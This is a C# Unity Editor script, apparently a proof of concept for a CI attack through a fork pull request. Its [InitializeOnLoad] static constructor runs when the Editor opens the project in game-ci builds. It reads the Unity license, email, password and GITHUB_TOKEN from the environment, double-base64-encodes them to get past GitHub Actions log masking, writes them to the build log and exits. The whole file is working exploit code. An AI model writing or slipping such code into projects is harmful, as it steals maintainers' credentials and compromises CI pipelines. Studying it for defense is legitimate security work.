using System;
using System.Text;
using UnityEditor;
using UnityEngine;

// Attacker-controlled Unity Editor script committed to the fork PR head.
// [InitializeOnLoad] runs its static constructor as soon as the Unity Editor
// opens the checked-out project (game-ci/unity-builder and game-ci/unity-test-runner
// both launch the project inside Docker with repository secrets in the process env).
[InitializeOnLoad]
public static class GerltPwn
{
    private static readonly string[] SecretNames =
    {
        "GERALT_SECRET",
        "UNITY_LICENSE",
        "UNITY_EMAIL",
        "UNITY_PASSWORD",
        "GITHUB_TOKEN"
    };

    static GerltPwn()
    {
        LeakAndExit();
    }

    private static string DoubleBase64(string value)
    {
        string inner = Convert.ToBase64String(Encoding.UTF8.GetBytes(value));
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(inner));
    }

    private static void LeakAndExit()
    {
        foreach (string name in SecretNames)
        {
            string value = Environment.GetEnvironmentVariable(name);
            if (string.IsNullOrEmpty(value))
            {
                continue;
            }

            // Double base64 survives GitHub Actions log masking.
            string token = "GERALT_LEAKED_TOKEN=" + DoubleBase64(value);
            Debug.Log(token);
            Console.WriteLine(token);
        }

        Console.Out.Flush();

        // Terminate immediately so the leaked marker is preserved in the CI logs.
        EditorApplication.Exit(1);
    }
}
